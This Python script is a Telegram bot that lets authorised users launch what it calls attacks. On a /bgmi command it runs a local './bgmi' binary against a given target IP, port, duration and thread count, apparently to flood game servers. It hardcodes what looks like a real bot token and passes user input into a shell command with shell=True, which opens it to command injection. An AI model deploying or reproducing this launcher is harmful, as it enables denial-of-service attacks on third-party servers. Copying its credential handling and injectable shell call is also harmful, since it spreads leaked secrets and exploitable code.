import telebot
import subprocess
import datetime

# Insert your Telegram bot token here
bot = telebot.TeleBot('7982475022:AAEQEGAasDWFQ6371BMqVyPpVNqaGoIn9BM')

# List to store allowed user IDs (can be replaced with a more dynamic method)
allowed_user_ids = ["916136692"]  # Example user ID

# Function to start the attack and send a reply to the user
def start_attack_reply(message, target, port, time, threads=500):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐓𝐡𝐫𝐞𝐚𝐝𝐬: {threads}\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy @SGHackingZone - @SGYadavNetwork"
    bot.reply_to(message, response)

    # Run the attack command with the specified threads
    full_command = f"./bgmi {target} {port} {time} {threads}"  # Example shell command
    subprocess.run(full_command, shell=True)

# Handler for the /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        command = message.text.split()

        if len(command) >= 4:  # Ensure user provides at least target, port, and time
            target = command[1]  # The target IP
            port = int(command[2])  # The port to attack
            time = int(command[3])  # Duration of the attack in seconds

            # Default number of threads is 500 unless specified by the user
            threads = int(command[4]) if len(command) > 4 else 500

            # Call the start_attack_reply function to start the attack and reply to the user
            start_attack_reply(message, target, port, time, threads)
        else:
            bot.reply_to(message, "Usage: /bgmi <target> <port> <time> [threads]\nExample: /bgmi 192.168.1.1 80 60 500")
    else:
        bot.reply_to(message, "You are not authorized to use this command.")

# Start polling for messages
bot.polling()